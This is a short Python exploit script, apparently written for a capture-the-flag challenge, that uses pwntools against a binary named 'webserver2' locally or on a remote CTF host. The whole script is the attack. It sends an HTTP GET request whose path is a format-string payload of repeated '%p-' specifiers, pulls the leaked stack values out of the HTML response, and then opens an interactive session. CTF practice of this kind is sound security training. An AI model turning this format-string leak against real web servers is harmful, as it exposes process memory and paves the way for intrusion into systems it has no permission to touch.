from pwn import *

if args.REMOTE:
    p = remote("ctf.makerforce.io", 8010)
else:
    p = process("./webserver2")

p.sendline("GET /input/" + "%p-"*100 + " HTTP/1.1");
p.recvuntil("<html><body><h1>")
leak = p.recvuntil("</h1>", True)
print(leak.split("-"))

pause()

p.interactive();
